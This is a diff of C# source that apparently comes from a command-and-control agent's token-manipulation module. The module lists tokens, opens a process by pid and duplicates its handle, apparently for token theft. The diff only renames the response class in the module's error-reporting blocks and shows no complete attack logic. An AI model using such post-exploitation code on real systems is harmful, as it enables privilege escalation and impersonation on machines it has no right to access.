@@ -53,7 +53,7 @@ namespace Agent
                     await messageManager.AddResponse(tokenManager.List(job));
                     break;
                 default:
-                    await messageManager.AddResponse(new ResponseResult()
+                    await messageManager.AddResponse(new TaskResponse()
                     {
                         user_output = $"Failed: Invalid action specified.",
                         status = "errored",
@@ -91,7 +91,7 @@ namespace Agent
                     out hToken
                     ))
                 {
-                    messageManager.AddResponse(new ResponseResult()
+                    messageManager.AddResponse(new TaskResponse()
                     {
                         user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                         completed = true,
@@ -106,7 +106,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                messageManager.AddResponse(new ResponseResult()
+                messageManager.AddResponse(new TaskResponse()
                 {
                     user_output = $"Failed: {e}",
                     status = "errored",
@@ -120,7 +120,7 @@ namespace Agent
         {
             if (!args.ContainsKey("pid"))
             {
-                messageManager.AddResponse(new ResponseResult()
+                messageManager.AddResponse(new TaskResponse()
                 {
                     user_output = $"Failed: no pid specified.",
                     status = "errored",
@@ -146,7 +146,7 @@ namespace Agent
 
                     if (!result)
                     {
-                        messageManager.AddResponse(new ResponseResult()
+                        messageManager.AddResponse(new TaskResponse()
                         {
                             user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                             status = "errored",
@@ -163,7 +163,7 @@ namespace Agent
 
                     if (!result)
                     {
-                        messageManager.AddResponse(new ResponseResult()
+                        messageManager.AddResponse(new TaskResponse()
                         {
                             user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                             status = "errored",
@@ -177,7 +177,7 @@ namespace Agent
 
                     if(dupHandle.IsInvalid)
                     {
-                        messageManager.AddResponse(new ResponseResult()
+                        messageManager.AddResponse(new TaskResponse()
                         {
                             user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                             status = "errored",
@@ -202,7 +202,7 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
-                    messageManager.AddResponse(new ResponseResult()
+                    messageManager.AddResponse(new TaskResponse()
                     {
                         user_output = $"Failed: {e}",
                         status = "errored",
